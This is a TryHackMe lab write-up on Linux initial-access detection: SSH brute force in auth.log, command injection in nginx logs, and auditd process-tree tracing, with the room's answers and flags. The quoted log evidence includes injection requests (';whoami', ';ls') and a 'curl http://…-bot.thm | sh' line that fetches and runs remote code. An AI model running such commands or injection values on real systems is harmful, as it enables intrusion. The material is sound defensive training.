---
title: Linux Threat Detection 1
module: Linux Security Monitoring
path: SOC Level 1
platform: TryHackMe
tags: [linux, threat-detection, ssh, initial-access, auditd, process-tree, mitre]
status: completed
date: 2026-06-28
date_completed: 2026-06-28
---

*Write-up by [Miyu7x](https://github.com/Miyu7x) | TryHackMe: [Miyu7](https://tryhackme.com/p/Miyu7) | BTLO: [Miyu7x](https://blueteamlabs.online/public/user/Miyu7x)*

<p align="center">
<img src=screenshots/linux_introthreat.png width="1500">
</p>

---

## Task 1 -- Introduction

### Learning Objectives

- Understand the role and risk of SSH in Linux environments
- Learn how Internet-exposed services can lead to breaches
- Utilize process tree analysis to identify the origin of the attack
- Practice detecting Initial Access techniques in realistic labs

---

1. I'm ready to start!

**Answer:** N/A

---

## Task 2 -- Initial Access via SSH

### Popularity of SSH

Exposed SSH is a leading cause of Linux breaches, as it is a remote service widely used by IT teams.
  - Every internet-facing Linux machine has SSH enabled by default
  - Shodan reports over 40 million machines worldwide in 2025, with only some secured

<p align="center">
<img src=screenshots/linux_shodanreport.png width="700">
</p>

### Initial Access via SSH

Windows has RDP and Linux has SSH, both powerful remote tools that are often left unsecured.
  - MITRE has included both these protocols under their own technique. External Remote Services ID T1133
  - Tactics: Initial Access and Persistence

**Common Risks of Key-Based Authentication**
  - Attackers will steal keys and SSH credentials from GitHub repos or Ansible automation
  - Infect an Admin's system with a data stealer to retrieve SSH keys

**Risks with Password-Based Authentication**
  - IT admin sets weak SSH password
  - IT sets up SSH for a contractor who sets a weak password
  - Accidental exposure of old insecure SSH server on the internet
---

**You can start from: cat /var/log/auth.log | grep "sshd"**

1. When did the ubuntu user log in via SSH for the first time? Answer Example: 2023-09-16.

<p align="center">
<img src=screenshots/linux_sshdlogin.png width="700">
</p>
In order to filter through the noise we can use the following keywords to narrow our log to find exactly what we need.
`Command: cat /var/log/auth.log | grep "sshd" | grep "ubuntu" | grep "Accepted"`

**Answer:** 2024-10-22

---

2. Did the ubuntu user use SSH keys instead of a password for the above found date? (Yea/Nay)

**Answer:** Yea

---

## Task 3 -- Detecting SSH Attacks

### SSH Breach Example

Real-World Scenario: An IT admin enables **public** SSH access to the server
  - Allows password-based authentication
  - Sets a weak password for one of the support users
      - These three actions, or lack thereof, will inevitably lead to an SSH breach, it's just a matter of time
   
**Example: Log Sample of Brute Force Followed by Password Breach**
<p align="center">
<img src=screenshots/linux_sshbreach.png width="700">
</p>

### Detecting SSH Attacks

Detecting an SSH attack on Linux is more direct than Windows: No Logon Types and Event ID memorizing
  - You can just filter Linux logs by Accepted(successful) SSH logins

**Example: Three Successful SSH Logins**
```
ubuntu@thm-vm:~$ cat /var/log/auth.log | grep -E 'Accepted'
2025-08-19T14:00:02 thm-vm sshd[1013]: Accepted publickey for ansible from 10.14.105.255 port 18442 ssh2: [...]
2025-08-20T12:56:49 thm-vm sshd[2830]: Accepted password for jsmith from 54.155.224.201 port 51058 ssh2
2025-08-22T03:14:06 thm-vm sshd[2830]: Accepted password for jsmith from 196.251.118.184 port 51058 ssh2
```

1. Ansible login through public key and automated account, at normal business hour of 14:00
2. JSmith logins are more interesting:
     - 2 password-based authentication logins
     - 1 login at 3am
         - Investigate who the user is?
         - Is this a normal login time for them?
         - Does this IP match the location they're supposed to be based in? Clean IP?
         - Login history for the user
         - After all those have been answered, you should determine if it requires further investigation

| Field | What to Check |
|---|---|
| Username | Who owns the user? Is the login time and IP expected? |
| Source IP | What do TI tools and asset lookups say? Trusted or malicious? |
| Login history | Was the login preceded by brute force or other suspicious events? |
| Next steps | Is the login suspicious? Should I analyze user actions following the login? |

---

1. When did the SSH password brute force start? Answer Format: 2023-09-15.

<p align="center">
<img src=screenshots/linux_sshbreach.png width="700">
</p>
Brute-Force attacks can be indicated by repeated failed login attempts in quick succession. This can be narrowed down by searching the logs for "Failed" sshd login attempts.
`Command: cat /var/log/auth.log | grep "sshd" | grep "Failed"`

**Answer:** 2025-08-21

---

2. Which four users did the botnet attempt to breach? Answer Format: Separate by a comma, in alphabetical order.

<p align="center">
<img src=screenshots/linux_users.png width="700">
</p>
Investigate the entire log, as the 4 different user names are spaced out throughout the log...

```
2025-08-21T16:34:04.201269+00:00 thm-vm sshd[18432]: Failed password for root from 197.39.195.136 port 47942 ssh2
2025-08-21T16:38:47.168117+00:00 thm-vm sshd[18479]: Failed password for invalid user sol from 193.32.162.145 port 46702 ssh2
2025-08-21T16:41:06.828985+00:00 thm-vm sshd[18495]: Failed password for invalid user roy from 80.94.95.112 port 63189 ssh2
2025-08-21T17:06:23.687748+00:00 thm-vm sshd[18544]: Failed password for invalid user user from 80.94.95.112 port 63350 ssh2
```

**Answer:** root, roy, sol, user

---

3. Finally, which IP managed to breach the root user?

<p align="center">
<img src=screenshots/linux_rootbreached.png width="700">
</p>
To find exactly what we're looking for in this scenario, we can narrow our search for the SSHD login to "Accepted," since we know it was successful, as well as the user "root" who was breached.
`Command: cat /var/log/auth.log | grep "sshd" | grep "Accepted" | grep "root"`

**Answer:** 91.224.92.79

---

## Task 4 -- Initial Access via Services

### Linux and Public Services

Linux sometimes hosts public-facing services or applications such as:
  - web servers, email servers, databases
  - various development or IT management tools
  - core of most firewalls and VPN software
  - Exploit Public Facing MITRE Technique T1190

If any of these applications are compromised, your entire host is at risk.

**Example: Insecure WordPress Website Breach Leads to Backdoor Uploaded to Linux Host**
<p align="center">
<img src=screenshots/linux_publicexploit.png width="700">
</p>

### Using Application Logs

Application Logs do not tell the full story of an attack, they can provide the following:
  - Web logs to detect web attacks
  - Database logs to detect suspicious SQL queries
  - VPN logs to detect abnormal VPN logins
  - Other logs to refer to specific events such as bank transactions for example

### Web as Initial Access

**Example of a Vulnerable Web Server**

The IT team creates a simple web app called TryPingMe
  - Users can ping the specified IP online
  - On the backend: the app runs a system command **ping -c 2 [User Input]** to test or ping the connection, with no input filtering
  - Attackers could easily find the command injection here

**Example: Command Injection on the TryPingMe Web Log**
```
ubuntu@thm-vm:~$ cat /var/log/nginx/access.log
10.2.33.10 - - [19/Aug/2025:12:26:07] "GET /ping?host=3.109.33.76 HTTP/1.1" 200 [...]
10.12.88.67 - - [23/Aug/2025:09:32:22] "GET /ping?host=54.36.19.83 HTTP/1.1" 200 [...]
10.14.105.255 - - [26/Aug/2025:20:09:43] "GET /ping?host=hello HTTP/1.1" 500 [...]
10.14.105.255 - - [26/Aug/2025:20:09:46] "GET /ping?host=whoami HTTP/1.1" 500 [...]
10.14.105.255 - - [26/Aug/2025:20:09:49] "GET /ping?host=;whoami HTTP/1.1" 200 [...]
10.14.105.255 - - [26/Aug/2025:20:10:41] "GET /ping?host=;ls HTTP/1.1" 200 [...]
```

The requests seen above are coming from IP 10.14.105.255 and seem suspicious.
  - You can see the evidence of command injection as the attacker tries hello, whoami and ls
  - This puts the entire system at risk

---

1. What is the path to the Python file the attacker attempted to open?

<p align="center">
<img src=screenshots/linux_pyfile.png width="700">
</p>
If we have evidence an attacker attempted to open a Python file, we can search our log for exactly that.
`Command: grep "/.py" /var/log/nginx/access.log`

**Answer:** /opt/trypingme/main.py

---

2. Looking inside the opened file, what's the flag you see there?

<p align="center">
<img src=screenshots/linux_readpyfile.png width="700">
</p>
In the above task, we located the path to the file the attacker tried to open. Let's read the file.
`Command: cat /opt/trypingme/main.py`

**Answer:** THM{i_am_vulnerable!}

---

## Task 5 -- Detecting Service Breach

### Building Process Tree

Application logs are not always available or helpful. Which is why SOCs rely on **Process Tree Analysis** to unwrap an Initial Access breach.
  - Process Trees can visually highlight how a breach happened and how to spot it in process creation logs
  - "whoami" is often a suspicious command

**Example: You spot a whoami command. What was the parent process, which is what comes before the whoami command? Follow the PPID trail.**
<p align="center">
<img src=screenshots/linux_processtree.png width="700">
</p>

### Auditd and Process Tree

When starting an investigation at the suspicious command **whoami** we can search for it with:
**ausearch -i -x whoami**
Now you have a starting point, we can follow the ppid line we retrieved from our search...

**Example: Tracing whoami Origin**
```
ubuntu@thm-vm:~$ ausearch -i -x whoami # -x filters the results by the command name
type=PROCTITLE msg=audit(08/25/25 16:28:18.107:985) : proctitle=whoami
type=SYSCALL msg=audit(08/25/25 16:28:18.107:985) : syscall=execve success=yes exit=0 items=2 ppid=3905 pid=3907 auid=unset uid=ubuntu tty=(none) exe=/usr/bin/whoami key=exec

ubuntu@thm-vm:~$ ausearch -i --pid 3905 # 3905 is a parent process ID of whoami
type=PROCTITLE msg=audit(08/25/25 16:28:17.101:983) : proctitle=/bin/sh -c whoami
type=SYSCALL msg=audit(08/25/25 16:28:17.101:983) : syscall=execve success=yes exit=0 items=2 ppid=3898 pid=3905 auid=unset uid=ubuntu tty=(none) exe=/usr/bin/dash key=exec

ubuntu@thm-vm:~$ ausearch -i --pid 3898 # 3898 is a grandparent process ID of whoami
type=PROCTITLE msg=audit(08/25/25 16:28:11.727:982) : proctitle=/usr/bin/python3 /opt/mywebapp/app.py
type=SYSCALL msg=audit(08/25/25 16:28:11.727:982) : syscall=execve success=yes exit=0 items=2 ppid=1 pid=3898 auid=unset uid=ubuntu tty=(none) exe=/usr/bin/python3.12 key=exec
```

How do we know this **whoami** command is actually suspicious? It could just be a normal app action.
  - Use a process tree to look for other suspicious commands launched by the app
  - Listing all child processes of **/opt/mywebapp/app.py** may reveal evidence of an app breach

**Example: Listing Child Processes**
```
ubuntu@thm-vm:~$ ausearch -i --ppid 3898 | grep 'proctitle' # Use grep for a simpler output
type=PROCTITLE msg=audit(08/25/25 16:28:17.101:983) : proctitle=/bin/sh -c whoami
type=PROCTITLE msg=audit(08/25/25 16:28:18.230:985) : proctitle=/bin/sh -c ls -la
type=PROCTITLE msg=audit(08/25/25 16:28:19.765:987) : proctitle=/bin/sh -c curl http://17gs9q1puh8o-bot.thm | sh
[...]
```

---

1. What is the PPID of the suspicious whoami command?

<p align="center">
<img src=screenshots/linux_whoamisearch.png width="700">
</p>
If an attacker has just breached your system, one common command they will run is whoami to find where on the network they are. Being able to trace and log such commands is vital for SOCs to spot and stop a breach.
`Command: sudo ausearch -i -x whoami`

**Answer:** 1018

---

2. Moving up the tree, what is the PID of the TryPingMe app?

<p align="center">
<img src=screenshots/linux_ppidtree.png width="700">
</p>
To trace this lead, we follow the ppid 1018, which is what happened before the whoami command was run.

**Answer:** 577

---

3. Which program did the attacker use to open a reverse shell?

<p align="center">
<img src=screenshots/linux_pythonfile.png width="700">
</p>
We can observe the attacker running various discovery commands. They use cat to read the .py file with the information, and they use Python to run the script.
`Command: sudo ausearch -i --ppid 577`

**Answer:** Python

---

## Task 6 -- Advanced Initial Access

### Human-Led Attacks

Although Linux users may be more technically knowledgeable, mistakes can still happen, and malware can still find a way into your system.

| Scenario Example | Consequences |
|---|---|
| IT member runs unverified script from forum via curl pipe bash | Script was malware, silently infected the server |
| Developer mistypes a Python package name (e.g., fastpi vs fastapi) | Mistyped package was deliberately prepared malware (typosquatting) |

### Supply Chain Compromise

Supply Chain attacks start with software being breached; once it is updated, it infects all users on the network.
  - Linux servers use hundreds of software programs maintained by several different developers, so an attack can come from anywhere
    Example:
      - A trusted app suddenly runs malicious commands
      - A backdoor in XZ Utils
      - A breach of tj-actions

### Detecting the Attacks

As we learned, **Initial Access** can be detected by **Process Tree Analysis**; it begins with:
  - An Alert sent by a SIEM concerning a suspicious command, ie: whoami or a suspicious connection to a known malicious IP
      - From there we can build a process tree to trace which application or which user initiated the event
          - a web server?
          - an internal app?
          - an IT admin SSH session?

It is up to the SOC to determine if any of those events are malicious and which are normal activities.

<p align="center">
<img src=screenshots/linux_detectexample.png width="700">
</p>

---

1. Which Initial Access technique is likely used if a trusted app suddenly runs malicious commands?

**Answer:** Supply Chain Compromise

---

2. Which detection method can you use to detect a variety of Initial Access techniques?

**Answer:** Process Tree Analysis

---

## Task 7 -- Conclusion

### Key Takeaways

- Attacks on SSH are widespread, but they are easy to detect via authentication logs
- Exposed services are always a risk since they can lead to a whole Linux compromise
- While phishing is not common on Linux, human-led and supply chain attacks are still possible
- Process tree analysis is your best approach in identifying Initial Access techniques

---

1. Let's continue!

**Answer:** N/A
